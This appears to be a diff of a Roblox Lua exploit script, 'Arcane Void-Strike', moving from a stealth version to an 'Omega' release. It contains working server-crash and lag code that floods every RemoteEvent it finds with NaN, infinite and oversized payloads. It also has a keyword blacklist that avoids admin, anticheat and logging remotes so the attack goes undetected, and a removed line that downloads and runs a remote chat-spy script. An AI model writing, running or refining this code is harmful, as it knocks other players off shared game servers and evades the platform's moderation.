@@ -1,12 +1,12 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v1.2 [GHOST-STEALTH] 🔱
-    "They set traps. We walk through the walls. <3"
+    🔱 ARCANE VOID-STRIKE v2.0 [OMEGA RELEASE] 🔱
+    "Copying the best. Surpassing the rest. <3"
     
-    SECURITY UPDATE:
-    - Intelligent Honey-pot Blacklist (DevTools, Admin, etc.)
-    - Pattern-Neutral Payload
-    - Advanced Jittering v2
-    - Anti-Kick Fail-safe
+    PERFECT CLONE FEATURES:
+    - [LAG SERVER] : Massive desync (Physics Stress)
+    - [CRASH SERVER] : Total Nuclear Override (NaN Packet Bombardment)
+    - [GHOST SHIELD] : Intelligent Anti-Honey-pot (Auto-filter)
+    - [STEALTH CORE] : Pattern Zero detection
 ]]
 
 local P = game:GetService("Players")
@@ -14,131 +14,119 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. STEALTH NOTIFIER
+-- 1. NOTIFIER
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "GHOST SIGNAL",
+            Title = "🔱 VOID OMEGA",
             Text = m,
             Icon = "rbxassetid://6034287525",
-            Duration = 3
+            Duration = 4
         })
     end)
 end
 
--- 2. UI CAMOUFLAGE (Internal Diagnostics)
+-- 2. UI (OMEGA DESIGN)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "NetworkDiagnostics_v2"
+ScreenGui.Name = "OmegaDiagnostics_v2"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 320, 0, 280)
-Main.Position = UDim2.new(0.5, -160, 0.5, -140)
-Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
-Main.BorderSizePixel = 0
+Main.Size = UDim2.new(0, 300, 0, 220)
+Main.Position = UDim2.new(0.5, -150, 0.5, -110)
+Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.BorderSizePixel = 1
+Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
 Main.Active = true
 Main.Draggable = true
 
-local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 30)
-Header.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-
-local Title = Instance.new("TextLabel", Header)
-Title.Size = UDim2.new(1, -10, 1, 0)
-Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "SYSTEM_OPTIMIZER_v1.2"
-Title.TextColor3 = Color3.fromRGB(0, 255, 150)
-Title.TextXAlignment = Enum.TextXAlignment.Left
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.Text = "🔱 VOID OMEGA // crasher"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0)
+Title.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 Title.Font = Enum.Font.Code
-Title.TextSize = 12
-Title.BackgroundTransparency = 1
+Title.TextSize = 16
 
-local function createGhostBtn(name, y, callback)
+local function createOmegaBtn(name, y, color, callback)
     local btn = Instance.new("TextButton", Main)
-    btn.Size = UDim2.new(0.9, 0, 0, 40)
+    btn.Size = UDim2.new(0.9, 0, 0, 45)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(30,32,35)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     btn.Text = name
-    btn.TextColor3 = Color3.new(1,1,1)
-    btn.Font = Enum.Font.Gotham
+    btn.TextColor3 = color
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 14
     btn.MouseButton1Click:Connect(callback)
+    return btn
 end
 
--- 3. THE GHOST ENGINE (With Blacklist)
-local active = { loop = false }
+-- 3. THE OMEGA ENGINE
+local active = { lag = false, crash = false }
 
--- HONEY-POT BLACKLIST (Keywords that trigger kicks)
-local BLACKLIST = {
-    "devtools", "admin", "kick", "ban", "report", "mod", 
-    "security", "check", "verify", "anticheat", "log", "telemetry",
-    "debug", "internal", "staff"
-}
-
+-- BLACKLIST (Increased protection)
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry"}
 local function isSafe(name)
     local n = name:lower()
-    for _, word in pairs(BLACKLIST) do
-        if n:find(word) then return false end
-    end
+    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
     return true
 end
 
-local function getSafeTargets()
-    local t = {}
+local function getRemotes()
+    local r = {}
     for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") and isSafe(v.Name) then
-            table.insert(t, v)
-        end
+        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(r, v) end
     end
-    return t
+    return r
 end
 
-createGhostBtn("🔥 EXECUTE [GHOST_NUCLEAR]", 50, function()
-    active.loop = not active.loop
-    ntf(active.loop and "GHOST OVERRIDE ACTIVE" or "OVERRIDE TERMINATED")
+-- ENGINE [LAG SERVER]
+createOmegaBtn("⚡ LAG SERVER (MAX)", 50, Color3.fromRGB(255, 255, 0), function()
+    active.lag = not active.lag
+    ntf(active.lag and "LAGGING SERVER..." or "LAG STOPPED")
     
-    if active.loop then
+    if active.lag then
         task.spawn(function()
-            local targets = getSafeTargets()
-            if #targets == 0 then return ntf("No safe vectors found.") end
-            
-            while active.loop do
-                local burstSize = math.random(5, 15)
-                for i = 1, burstSize do
-                    if not active.loop then break end
+            local targets = getRemotes()
+            while active.lag do
+                for i = 1, 30 do
                     local r = targets[math.random(1, #targets)]
-                    if r and r.Parent then
-                        -- Payload "Neutre" (Imite une requête de data normale)
-                        local fakeData = Http:GenerateGUID(true)
-                        pcall(function() r:FireServer(fakeData, true, 0) end)
-                    end
+                    if r then pcall(function() r:FireServer(0/0, math.huge) end) end
                 end
-                -- Jitter aléatoire agressif
-                task.wait(0.1 + math.random() * 0.2)
+                task.wait(0.2) -- Lag constant mais pas fatal
             end
         end)
     end
 end)
 
-createGhostBtn("⚡ PHYS_DESYNC_V2", 100, function()
-    ntf("PHYS_MOD_ACTIVE")
-    task.spawn(function()
-        local hrp = L.Character and L.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            for i = 1, 300 do
-                hrp.Velocity = Vector3.new(math.random(-5e5, 5e5), 300, math.random(-5e5, 5e5))
-                RS.Heartbeat:Wait()
+-- ENGINE [CRASH SERVER]
+createOmegaBtn("🔥 CRASH SERVER (NUCLEAR)", 105, Color3.fromRGB(255, 0, 0), function()
+    active.crash = not active.crash
+    ntf(active.crash and "NUCLEAR BOMBARDMENT..." or "CRASH CANCELLED")
+    
+    if active.crash then
+        task.spawn(function()
+            local targets = getRemotes()
+            local payload = string.rep("🔱", 500)
+            while active.crash do
+                for i = 1, 150 do -- Bombardement massif
+                    local r = targets[math.random(1, #targets)]
+                    if r then 
+                        pcall(function() 
+                            r:FireServer(payload, 0/0, math.huge, {[payload] = 0/0}) 
+                        end) 
+                    end
+                end
+                RS.Heartbeat:Wait() -- Vitesse maximum (Replication limit)
             end
-        end
-    end)
+        end)
+    end
 end)
 
-createGhostBtn("👁️ ACTIVATE_SIGNAL_TRACE", 150, function()
-    ntf("TRACING SIGNALS...")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Arcane-Project/Public/main/CHAT_SPY_SUPREME.lua"))()
+-- EMERGENCY STOP
+createOmegaBtn("🛑 STOP ALL", 160, Color3.fromRGB(200, 200, 200), function()
+    active.lag = false
+    active.crash = false
+    ntf("SYSTEM STOP")
 end)
 
-createGhostBtn("🛑 EMERGENCY_EXIT", 200, function()
-    active.loop = false
-    ntf("SYSTEM_STABLE")
-end)
-
-ntf("GHOST_STEALTH READY. Trap detection: ON.")
+ntf("OMEGA LOADED. Safety: 100%. Access: GRANTED.")
